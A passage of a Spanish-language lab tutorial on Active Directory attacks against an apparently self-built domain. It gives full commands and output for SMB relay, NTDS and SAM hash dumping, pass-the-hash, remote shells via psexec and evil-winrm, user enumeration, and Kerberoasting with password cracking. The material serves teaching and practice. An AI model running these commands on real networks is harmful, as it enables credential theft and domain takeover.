Ahora sabes que sobre ese equipo el usuario `marcelo` es admin sobre `ramlux`.

Y si hacemos lo siguiente:

```shell
proxychains crackmapexec smb 192.168.5.149 -u 'mvazquez' -p 'test' -d 'd1sec0rp'
```

Metiendo cualquier password, nos pondra `(Pwn3d!)` en el `PC-Ramlux`.

Con esto que cabamos de ver lo que hemos echo es hacer un `relay` de forma tunelizada de las credenciales del usuario.

Y si queremos extraer los hashes podremos hacerlo de la siguiente forma:

```shell
proxychains crackmapexec smb 192.168.5.149 -u 'mvazquez' -p 'test' -d 'd1sec0rp' --sam
```

### Autenticarnos con las credenciales

Anteriormente en el archivo `hashes` extragimos las credenciales con `john` de los usuarios, por lo que nos podremos conectar con esas credenciales de la siguiente forma.

```shell
impacket-psexec d1sec0rp.local/Administrador:'P@$$w0rd!'@192.168.5.150 cmd.exe
```

Info:

```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.5.150.....
[*] Found writable share ADMIN$
[*] Uploading file sAYGgNPW.exe
[*] Opening SVCManager on 192.168.5.150.....
[*] Creating service nVfA on 192.168.5.150.....
[*] Starting service nVfA.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.14393]

(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

Y con esto ya estariamos dentro.

Despues se pueden hacer mas cosas, con el `crackmapexece` podremos verificar con esa contraseña sobre que equipos poder ejecutar lo que queramos:

```shell
crackmapexec smb 192.168.5.0/24 -u 'Administrador' -p 'P@$$w0rd!'
```

Info:

```
SMB         192.168.5.1     445    MSI              [*] Windows 11 Build 22621 x64 (name:MSI) (domain:MSI) (signing:False) (SMBv1:False)
SMB         192.168.5.1     445    MSI              [-] MSI\Administrador:P@$$w0rd! STATUS_LOGON_FAILURE 
SMB         192.168.5.150   445    DC-COMPANY       [*] Windows Server 2016 Standard 14393 x64 (name:DC-COMPANY) (domain:d1sec0rp.local) (signing:True) (SMBv1:True)
SMB         192.168.5.152   445    PC-MARCELO       [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-MARCELO) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.149   445    PC-RAMLUX        [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-RAMLUX) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.150   445    DC-COMPANY       [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.152   445    PC-MARCELO       [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.149   445    PC-RAMLUX        [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
```

Y vemos que podriamos en todos, por lo que si queremos activar o ejecutar algun comando, se podria hacer con el `-X` o si queremos activar el `RDP` para hacer otro tipo de ataques, se podria hacer asi:

```shell
crackmapexec smb 192.168.5.0/24 -u 'Administrador' -p 'P@$$w0rd!' -M rdp -o action=enable
```

Info:

```
SMB         192.168.5.1     445    MSI              [*] Windows 11 Build 22621 x64 (name:MSI) (domain:MSI) (signing:False) (SMBv1:False)
SMB         192.168.5.1     445    MSI              [-] MSI\Administrador:P@$$w0rd! STATUS_LOGON_FAILURE 
SMB         192.168.5.149   445    PC-RAMLUX        [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-RAMLUX) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.150   445    DC-COMPANY       [*] Windows Server 2016 Standard 14393 x64 (name:DC-COMPANY) (domain:d1sec0rp.local) (signing:True) (SMBv1:True)
SMB         192.168.5.152   445    PC-MARCELO       [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-MARCELO) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.149   445    PC-RAMLUX        [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.150   445    DC-COMPANY       [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.152   445    PC-MARCELO       [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
RDP         192.168.5.150   445    DC-COMPANY       [+] RDP enabled successfully
RDP         192.168.5.149   445    PC-RAMLUX        [+] RDP enabled successfully
RDP         192.168.5.152   445    PC-MARCELO       [+] RDP enabled successfully
```

Y nos pondria `RDP enabled successfully` en las 3.

Pero realmente lo que hay que hacer cuando puedes conectarte a un usuario administrador es dumpearte todos los hashes `NTDS` para tener todos los hashes de todos los usuarios, podremos hacerlo de la siguiente forma:

```shell
crackmapexec smb 192.168.5.0/24 -u 'Administrador' -p 'P@$$w0rd!' --ntds vss
```

Info:

```
SMB         192.168.5.1     445    MSI              [*] Windows 11 Build 22621 x64 (name:MSI) (domain:MSI) (signing:False) (SMBv1:False)
SMB         192.168.5.1     445    MSI              [-] MSI\Administrador:P@$$w0rd! STATUS_LOGON_FAILURE 
SMB         192.168.5.150   445    DC-COMPANY       [*] Windows Server 2016 Standard 14393 x64 (name:DC-COMPANY) (domain:d1sec0rp.local) (signing:True) (SMBv1:True)
SMB         192.168.5.149   445    PC-RAMLUX        [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-RAMLUX) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.152   445    PC-MARCELO       [*] Windows 10 / Server 2019 Build 19041 x64 (name:PC-MARCELO) (domain:d1sec0rp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.150   445    DC-COMPANY       [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.149   445    PC-RAMLUX        [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.152   445    PC-MARCELO       [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.149   445    PC-RAMLUX        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.5.149   445    PC-RAMLUX        [+] Dumped 0 NTDS hashes to /root/.cme/logs/PC-RAMLUX_192.168.5.149_2024-10-27_113232.ntds of which 0 were added to the database
SMB         192.168.5.152   445    PC-MARCELO       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.5.152   445    PC-MARCELO       [+] Dumped 0 NTDS hashes to /root/.cme/logs/PC-MARCELO_192.168.5.152_2024-10-27_113232.ntds of which 0 were added to the database
SMB         192.168.5.150   445    DC-COMPANY       [-] Could not get a VSS
SMB         192.168.5.150   445    DC-COMPANY       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.5.150   445    DC-COMPANY       Administrador:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         192.168.5.150   445    DC-COMPANY       Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.150   445    DC-COMPANY       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f586595761bf8c3ca29e776b7ab0e94f:::
SMB         192.168.5.150   445    DC-COMPANY       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.150   445    DC-COMPANY       d1sec0rp.local\mvazquez:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.150   445    DC-COMPANY       d1sec0rp.local\ramlux:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         192.168.5.150   445    DC-COMPANY       DC-COMPANY$:1000:aad3b435b51404eeaad3b435b51404ee:30d5eceb011d9b5ff095d17647694c55:::
SMB         192.168.5.150   445    DC-COMPANY       PC-MARCELO$:1105:aad3b435b51404eeaad3b435b51404ee:8545c201146d297a0f035540072db7a7:::
SMB         192.168.5.150   445    DC-COMPANY       PC-RAMLUX$:1106:aad3b435b51404eeaad3b435b51404ee:746ad38753bd29cb8c1f5231142f4536:::
SMB         192.168.5.150   445    DC-COMPANY       [+] Dumped 9 NTDS hashes to /root/.cme/logs/DC-COMPANY_192.168.5.150_2024-10-27_113232.ntds of which 6 were added to the database
```

Y como se podra ver, tendriamos los hashes de todos los usuarios o si queremos ir desde el servidor de los usuarios, podremos hacer con la IP del propio servidor:

```shell
crackmapexec smb 192.168.5.150 -u 'Administrador' -p 'P@$$w0rd!' --ntds vss
```

Info:

```
SMB         192.168.5.150   445    DC-COMPANY       [*] Windows Server 2016 Standard 14393 x64 (name:DC-COMPANY) (domain:d1sec0rp.local) (signing:True) (SMBv1:True)
SMB         192.168.5.150   445    DC-COMPANY       [+] d1sec0rp.local\Administrador:P@$$w0rd! (Pwn3d!)
SMB         192.168.5.150   445    DC-COMPANY       [-] Could not get a VSS
SMB         192.168.5.150   445    DC-COMPANY       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.5.150   445    DC-COMPANY       Administrador:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         192.168.5.150   445    DC-COMPANY       Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.150   445    DC-COMPANY       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f586595761bf8c3ca29e776b7ab0e94f:::
SMB         192.168.5.150   445    DC-COMPANY       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.150   445    DC-COMPANY       d1sec0rp.local\mvazquez:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.150   445    DC-COMPANY       d1sec0rp.local\ramlux:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         192.168.5.150   445    DC-COMPANY       DC-COMPANY$:1000:aad3b435b51404eeaad3b435b51404ee:30d5eceb011d9b5ff095d17647694c55:::
SMB         192.168.5.150   445    DC-COMPANY       PC-MARCELO$:1105:aad3b435b51404eeaad3b435b51404ee:8545c201146d297a0f035540072db7a7:::
SMB         192.168.5.150   445    DC-COMPANY       PC-RAMLUX$:1106:aad3b435b51404eeaad3b435b51404ee:746ad38753bd29cb8c1f5231142f4536:::
SMB         192.168.5.150   445    DC-COMPANY       [+] Dumped 9 NTDS hashes to /root/.cme/logs/DC-COMPANY_192.168.5.150_2024-10-27_113742.ntds of which 6 were added to the database
```

Y sabemos que el usuario `mvazquez` tenia control administrativo sobre el equipo `ramlux`, por lo que podriamos coger dicho hash y hacer lo siguiente. (Podriamos hacer `Pass-The-Hash` o intentar crackear la contarseña, en tal caso de que no la supieramos)

```shell
impacket-wmiexec d1sec0rp.local/mvazquez@192.168.5.152 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```

Y con esto estariamos dentro sin ningun tipo de contraseña.

### Usuario temporal vulnerabilidad

Muchas veces las empresas crean usuarios temporales, los cuales se utilizan para testear cosas dentro de la empresa y muchos de ellos tienen descripciones en las cuales se puede filtrar la contarseña del mismo usuario.

Crearemos un usuario de dominio llamado `test` en el servidor `DC` con una descripcion en la que ponga su contarseña, por ejemplo `Password temporal: mypassword123#`, ahora como atacante tendremos que saber que usuarios hay en el sistema del dominio y se podra hacer de la siguiente forma.

```shell
rpcclient -U "d1sec0rp.local\mvazquez%Password1" 192.168.5.150 -c 'enumdomusers'
```

Info:

```
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[mvazquez] rid:[0x44f]
user:[ramlux] rid:[0x450]
user:[test] rid:[0x453]
```

Con esto veremos que hay un usuario `test`, pero si lo queremos filtrar de una forma mas sencilla de ver, podremos hacerlo filtrando los caracteres especiales o el texto que no queremos que se vea de la siguiente forma:

```shell
rpcclient -U "d1sec0rp.local\mvazquez%Password1" 192.168.5.150 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
```

Info:

```
[Administrador]
[Invitado]
[krbtgt]
[DefaultAccount]
[mvazquez]
[ramlux]
[test]
```

Y estos seran los usuarios reales del dominio, pero si queremos filtrarlo mediante los `0x` para alante para hacer una cosa ahora mas adelante, seria de la siguiente forma:

```shell
rpcclient -U "d1sec0rp.local\mvazquez%Password1" 192.168.5.150 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
```

Info:

```
0x1f4
0x1f5
0x1f6
0x1f7
0x44f
0x450
0x453
```

Ahora si queremos ver el nombre de usuario y la descripcion de todos los usuarios con esa `RID` de una forma bonita a los ojos, lo podremos hacer de la siguiente forma:

```shell
for rid in $(rpcclient -U "d1sec0rp.local\mvazquez%Password1" 192.168.5.150 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] Para el RID $rid:\n"; rpcclient -U "d1sec0rp.local\mvazquez%Password1" 192.168.5.150 -c "queryuser $rid" | grep -E -i "user name|description" ;done 
```

Info:

```
[+] Para el RID 0x1f4:

	User Name   :	Administrador
	Description :	Cuenta integrada para la administración del equipo o dominio

[+] Para el RID 0x1f5:

	User Name   :	Invitado
	Description :	Cuenta integrada para el acceso como invitado al equipo o dominio

[+] Para el RID 0x1f6:

	User Name   :	krbtgt
	Description :	Cuenta de servicio de centro de distribución de claves

[+] Para el RID 0x1f7:

	User Name   :	DefaultAccount
	Description :	Cuenta de usuario administrada por el sistema.

[+] Para el RID 0x44f:

	User Name   :	mvazquez
	Description :	

[+] Para el RID 0x450:

	User Name   :	ramlux
	Description :	

[+] Para el RID 0x453:

	User Name   :	test
	Description :	Password temporal: mypassword123#
```

Y por lo que vemos el usuario `test` tiene en la descripcion su password.

### Usuarios administradores del dominio

Ahora para poner en practica otra tecnica, vamos a crear un usuario de dominio, copiando el de `Administrador` y rellenando la informacion de la siguiente forma:

```
Nombre de pila = SVC_SQLservice
Nombre de inicio de sesion de usuario = svc_sqlservice
```

Le daremos a siguiente y pondremos como contraseña por ejemplo:

```
Password = mypassword123#
```

Finalizaremos la creacion y ya tendremos el usuario creado.

Ahora enumeraremos los usuarios administradores del dominio, se puede hacer de muchas formas, una de ellas es la siguiente.

```shell
rpcclient -U "d1sec0rp.local\mvazquez%Password1" 192.168.5.150
```

Estando dentro ponemos...

```shell
enumdomgroups
```

Info:

```
group:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
group:[Admins. del dominio] rid:[0x200]
group:[Usuarios del dominio] rid:[0x201]
group:[Invitados del dominio] rid:[0x202]
group:[Equipos del dominio] rid:[0x203]
group:[Controladores de dominio] rid:[0x204]
group:[Administradores de esquema] rid:[0x206]
group:[Administradores de empresas] rid:[0x207]
group:[Propietarios del creador de directivas de grupo] rid:[0x208]
group:[Controladores de dominio de sólo lectura] rid:[0x209]
group:[Controladores de dominio clonables] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Administradores clave] rid:[0x20e]
group:[Administradores clave de la organización] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
```

Y vemos que los usuarios administradores del dominios estan en el `0x200` por lo que enumeraremos ese.

```shell
querygroupmem 0x200
```

Info:

```
rid:[0x1f4] attr:[0x7]
rid:[0x454] attr:[0x7]
```

Y tendriamos 2 usuarios, si queremos ver la informacion de cada usuario, lo haremos con su `RID` de la siguiente forma:

```
queryuser 0x1f4
```

Info:

```
	User Name   :	Administrador
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Cuenta integrada para la administración del equipo o dominio
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Sun, 27 Oct 2024 10:14:11 EDT
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Sun, 27 Oct 2024 09:35:28 EDT
	Password can change Time :	Mon, 28 Oct 2024 09:35:28 EDT
	Password must change Time:	Sun, 08 Dec 2024 08:35:28 EST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000000b
	padding1[0..7]...
	logon_hrs[0..21]...
```

Y para el segundo:

```shell
queryuser 0x454
```

Info:

```
	User Name   :	svc_sqlservice
	Full Name   :	SVC_SQLservice
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Sun, 27 Oct 2024 12:22:13 EDT
	Password can change Time :	Mon, 28 Oct 2024 12:22:13 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

Con esto ya veriamos la info de los usuarios.

Podremos hacerlo de otra forma, mediante un servidor de apache, para que se vea representado en una pagina web.

```shell
systemctl start apache2
```

```shell
git clone https://github.com/dirkjanm/ldapdomaindump.git
cd ldapdomaindump/
```

```shell
cd /var/www/html
rm i*
```

```shell
python3 /opt/ldapdomaindump/ldapdomaindump.py -u 'd1sec0rp.local\mvazquez' -p 'Password1' 192.168.5.150
```

Info:

```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Y con esto ya lo tendriamos echo, por lo que ahora lo veremos de la siguiente forma.

```
URL = http://localhost
```

Y aqui estaria toda la enumeracion de los usuarios de dominio y demas.

Por otro lado, si hacemos un escaneo de puertos al servidor de la siguiente forma:

```shell
nmap -sS --min-rate 5000 -vvv -n -Pn -p- 192.168.5.150
```

Veremos lo siguiente:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 12:47 EDT
Initiating ARP Ping Scan at 12:47
Scanning 192.168.5.150 [1 port]
Completed ARP Ping Scan at 12:47, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:47
Scanning 192.168.5.150 [65535 ports]
Discovered open port 135/tcp on 192.168.5.150
Discovered open port 445/tcp on 192.168.5.150
Discovered open port 139/tcp on 192.168.5.150
Discovered open port 53/tcp on 192.168.5.150
Discovered open port 49666/tcp on 192.168.5.150
Discovered open port 49667/tcp on 192.168.5.150
Discovered open port 3268/tcp on 192.168.5.150
Discovered open port 49670/tcp on 192.168.5.150
Discovered open port 636/tcp on 192.168.5.150
Discovered open port 49669/tcp on 192.168.5.150
Discovered open port 49672/tcp on 192.168.5.150
Discovered open port 49685/tcp on 192.168.5.150
Discovered open port 9389/tcp on 192.168.5.150
Discovered open port 464/tcp on 192.168.5.150
Discovered open port 60813/tcp on 192.168.5.150
Discovered open port 593/tcp on 192.168.5.150
Discovered open port 5985/tcp on 192.168.5.150
Discovered open port 88/tcp on 192.168.5.150
Discovered open port 3269/tcp on 192.168.5.150
Discovered open port 389/tcp on 192.168.5.150
Completed SYN Stealth Scan at 12:47, 26.36s elapsed (65535 total ports)
Nmap scan report for 192.168.5.150
Host is up, received arp-response (0.00049s latency).
Scanned at 2024-10-27 12:47:04 EDT for 27s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49672/tcp open  unknown          syn-ack ttl 128
49685/tcp open  unknown          syn-ack ttl 128
60813/tcp open  unknown          syn-ack ttl 128
MAC Address: 00:0C:29:A7:D5:FD (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131066 (5.767MB) | Rcvd: 36 (1.568KB)
```

Un puerto interesante que nos dice que `winrm` esta habilitado (`5985/tcp open wsman syn-ack ttl 128`) por lo que podremos hacer lo siguiente ya que descubrimos unas cuantas contarseñas y en concreto la de `SVC_SQLservice` que es administrador:

```shell
evil-winrm -u 'SVC_SQLservice' -p 'mypassword123#' -i 192.168.5.150
```

Info:

```
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_sqlservice\Documents> whoami 
d1sec0rp\svc_sqlservice
*Evil-WinRM* PS C:\Users\svc_sqlservice\Documents> 
```

Con esto ya estariamos dentro.

## Ataque Kerberoasting (Practica)

Imaginemos que no sabemos la contraseña del usuario `SVC_SQLservice`, podremos hacer lo siguiente.

Primero en el servidor `DC` configuraremos lo siguiente. (Estableceremos un `service principal name`)

Abriremos el `cmd` en el server:

```cmd
setspn -a d1sec0rp.local/SVC_SQLservice.DC-Company d1sec0rp.local\SVC_SQLservice
```

Con esto estableceremos un `SPN` al usuario `SVC_SQLservice` y nos pondra `Objeto actualizado` por lo que ya lo habriamos establecido.

Ahora si esto lo comprobamos como atacantes de la siguiente forma:

```shell
impacket-GetUserSPNs d1sec0rp.local/mvazquez:Password1
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name            MemberOf                                                                          PasswordLastSet             LastLogon  Delegation 
----------------------------------------  --------------  --------------------------------------------------------------------------------  --------------------------  ---------  ----------
d1sec0rp.local/SVC_SQLservice.DC-Company  svc_sqlservice  CN=Propietarios del creador de directivas de grupo,CN=Users,DC=d1sec0rp,DC=local  2024-10-27 12:22:12.836789  <never>               
```

Ahora como atacante viendo esto, podremos extraer el hash `TGS` del usuario.

```shell
impacket-GetUserSPNs d1sec0rp.local/mvazquez:Password1 -request
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name            MemberOf                                                                          PasswordLastSet             LastLogon  Delegation 
----------------------------------------  --------------  --------------------------------------------------------------------------------  --------------------------  ---------  ----------
d1sec0rp.local/SVC_SQLservice.DC-Company  svc_sqlservice  CN=Propietarios del creador de directivas de grupo,CN=Users,DC=d1sec0rp,DC=local  2024-10-27 12:22:12.836789  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_sqlservice$D1SEC0RP.LOCAL$d1sec0rp.local/svc_sqlservice*$f136566fa4d65868b6dd62e016790eea$c60de5931d631a7a59d424a4fd4966e54fb5a02fc557d71170b183b122a07d9f3d974e83dba202b02d8f5bcf57f3bb59eda27f849cac7e56e186b0cea31fc20ef6d6977ccee73786f6d41b96039f141c68a82a25bc78a8003cfbe9fe2d7ccbc169703d5ac5d15b5de18b0fd80a732c32fde08c7077f563b2f4776338bafe32fedca19fb26ba95c5d541c2e79a190d8993467e6c5c35440f1923549d85a2b0356bf5851807290fca83a9a22171dd70bfb7bf4a81c4d2adcfc339ab177f032460ec1c05c0e9d82b65eadc77af6e8600c61e952cccf9c70543a4f880720fb3369cf8b624ff473edc209c9e6d190dca20ecb35671ef64320774c0e036e19d68bca794c5d396c6cb24a890f4eb67625b8bed7cbe3d3447b74d9ff0a7b382b559f75f3f9e2ea8423089f3ecf73d9b06edd4052fc9b5212af061ee6c363b7db25521aa4901a664fdacfab6d4307bb549fbd32c9eaa9b9b759314d1c721afd264b0ad467bf7ef56bfbc82c63e19ad7b9a3cee9007a1d929d85f0bcbf1b9823b8686be14698e2de98c2b922ceb973d661e8ea45babd33074d4a88eb8cc944fc3e6802a605caa9c4985c112a49b03c4a3cb6bbe42e53b6bff8e7a7f0a7e169c37fafa3b03bc715384526181b25fd1952316b3a51f43881aa6082e36977567319132e1e62aa30b21de244385f1e3c6b27340a76609535df2252055ae76aaea7a4b9e5a70e22af4fef22895c3035a7b865562aaea40e4f271c6e4ad2ec641bdac2277c5d9a5aaad9a3671ff314f0d2b9906ab5ac0ae2a8b51641d607e27edebe4e4898b906e9434cbdc53440121dedd929a131520973643be5de62dadaa2a29d500bc8b7bf812bfbdb59f4956fa10218d149a90e730adc60c126e356cde029fdf41f1a461d53858f245e5e49e98d7e4aa2f91a18050a9c1683269a7cb05d4a9c2f74b6aa0e3f3904cf0a0f6f3f61026510300e2616c3c5dd71380deae5fc341a6d779989a2cee812551e77acbe5290b66e5c5760598e66a3eaaf17f6d429a75829be33cf8757fd96500071c5d978762e543c3355fea0bd3d19ab8165e16420452158baa8c7fed783229d7e55775672c1f3396190731d17e7cfb165d1cf384d17ae60153baa536916b38c31d322dc4b9d93ed457770a35934af7dfc6dea5466929082960686b7e82464fa2c5a247de65c09e1bfbb6c4b8032e43f43d55872ca5cf68977f31d522ded0b3d4ea2252fb6fcab39363e3b73beae0aa310a0d0a728377a0694af0ada4fe1fb341c840f3000eb028a8bc88aaea995c32ff6e79462f51cb26d6f41e034471e9e0dd90ca0e714e25624ee5126fdaf580b846e7d7951a397a3893ac836717c3c8ef38f03f5
```

Y como veremos obtendremos el `TGS`.

Pegaremos ese hash en un archivo:

```shell
nano hash

#Dentro de hash
$krb5tgs$23$*svc_sqlservice$D1SEC0RP.LOCAL$d1sec0rp.local/svc_sqlservice*$f136566fa4d65868b6dd62e016790eea$c60de5931d631a7a59d424a4fd4966e54fb5a02fc557d71170b183b122a07d9f3d974e83dba202b02d8f5bcf57f3bb59eda27f849cac7e56e186b0cea31fc20ef6d6977ccee73786f6d41b96039f141c68a82a25bc78a8003cfbe9fe2d7ccbc169703d5ac5d15b5de18b0fd80a732c32fde08c7077f563b2f4776338bafe32fedca19fb26ba95c5d541c2e79a190d8993467e6c5c35440f1923549d85a2b0356bf5851807290fca83a9a22171dd70bfb7bf4a81c4d2adcfc339ab177f032460ec1c05c0e9d82b65eadc77af6e8600c61e952cccf9c70543a4f880720fb3369cf8b624ff473edc209c9e6d190dca20ecb35671ef64320774c0e036e19d68bca794c5d396c6cb24a890f4eb67625b8bed7cbe3d3447b74d9ff0a7b382b559f75f3f9e2ea8423089f3ecf73d9b06edd4052fc9b5212af061ee6c363b7db25521aa4901a664fdacfab6d4307bb549fbd32c9eaa9b9b759314d1c721afd264b0ad467bf7ef56bfbc82c63e19ad7b9a3cee9007a1d929d85f0bcbf1b9823b8686be14698e2de98c2b922ceb973d661e8ea45babd33074d4a88eb8cc944fc3e6802a605caa9c4985c112a49b03c4a3cb6bbe42e53b6bff8e7a7f0a7e169c37fafa3b03bc715384526181b25fd1952316b3a51f43881aa6082e36977567319132e1e62aa30b21de244385f1e3c6b27340a76609535df2252055ae76aaea7a4b9e5a70e22af4fef22895c3035a7b865562aaea40e4f271c6e4ad2ec641bdac2277c5d9a5aaad9a3671ff314f0d2b9906ab5ac0ae2a8b51641d607e27edebe4e4898b906e9434cbdc53440121dedd929a131520973643be5de62dadaa2a29d500bc8b7bf812bfbdb59f4956fa10218d149a90e730adc60c126e356cde029fdf41f1a461d53858f245e5e49e98d7e4aa2f91a18050a9c1683269a7cb05d4a9c2f74b6aa0e3f3904cf0a0f6f3f61026510300e2616c3c5dd71380deae5fc341a6d779989a2cee812551e77acbe5290b66e5c5760598e66a3eaaf17f6d429a75829be33cf8757fd96500071c5d978762e543c3355fea0bd3d19ab8165e16420452158baa8c7fed783229d7e55775672c1f3396190731d17e7cfb165d1cf384d17ae60153baa536916b38c31d322dc4b9d93ed457770a35934af7dfc6dea5466929082960686b7e82464fa2c5a247de65c09e1bfbb6c4b8032e43f43d55872ca5cf68977f31d522ded0b3d4ea2252fb6fcab39363e3b73beae0aa310a0d0a728377a0694af0ada4fe1fb341c840f3000eb028a8bc88aaea995c32ff6e79462f51cb26d6f41e034471e9e0dd90ca0e714e25624ee5126fdaf580b846e7d7951a397a3893ac836717c3c8ef38f03f5
```

Lo guardamos y lo intentariamos crackear.

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypassword123#   (?)     
1g 0:00:00:43 DONE (2024-10-27 13:32) 0.02294g/s 248823p/s 248823c/s 248823C/s MaggieMoo1994..MYROY16
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Por lo que vemos nos la ha crackeado.

